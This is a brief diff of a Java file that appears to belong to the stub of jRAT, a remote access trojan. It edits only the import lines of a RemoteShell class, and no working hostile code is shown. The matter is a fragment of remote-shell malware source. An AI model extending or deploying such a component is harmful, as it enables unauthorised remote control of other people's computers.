@@ -1,11 +1,9 @@
 package io.jrat.stub;
 
 import io.jrat.stub.packets.outgoing.Packet21RemoteShell;
-
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-
-import com.redpois0n.oslib.Shell;
+import oslib.Shell;
 
 public class RemoteShell extends Thread {
 
